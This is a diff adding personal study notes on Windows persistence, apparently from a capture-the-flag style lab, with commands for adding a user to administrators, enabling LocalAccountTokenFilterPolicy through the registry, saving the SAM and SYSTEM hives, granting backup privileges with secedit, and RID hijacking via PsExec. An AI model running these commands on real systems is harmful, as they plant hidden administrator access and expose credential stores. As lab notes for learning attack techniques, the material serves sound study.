@@ -96,7 +96,36 @@ schtasks /run /tn vulntask // to run a schtask
 ~~AccessChk // tool used to check a service DACL from cmd
 ~~wmic product //to list down all software nad version installed on the target system
 
-
+----------------------------------------
+Tmapering Unprivilages Users
+---------------------------------------
     
+~~net localgroup administrators thmuser0 /add //making unprivilageed user thmuser0 to administrators group
 
+ONe of the features implementes by UAC is Local AccountTokenPolicy, strips any local account of its administrative privileges when logging in remotely. While we can elevate our privilages through UAC from GUI. WHile using Evil-WInrm its is confined to a limited access token with no administartive privillages
 
+to regain admin privilages we'll have to disable LocalAccountTokenFilterPolicy by changing the following registry key to 1:
+~~reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
+
+reg save hklm\system system.bak //make a backup of SAM and SYSTEM files
+
+adding a user to the Backup Operators group can be achieved without modifying any group membership
+
+SeBackupPrivilege: The user can read any file in the system, ignoring any DACL in place.
+SeRestorePrivilege: The user can write any file in the system, ignoring any DACL in place.
+
+secedit /export /cfg config.inf
+
+secedit /import /cfg config.inf /db config.sdb
+
+secedit /configure /db config.sdb /cfg config.inf
+
+RID hijacking
+
+wmic useraccount get name,sid // to get the RID corresponding to wach username
+
+in order to change RID 500 to a local user we need to access SAM using regedit, which is only accessible by system account, to run regedit as system account use PsExec64.exe tool
+
+PsExec64.exe -i -s regedit
+
+ 
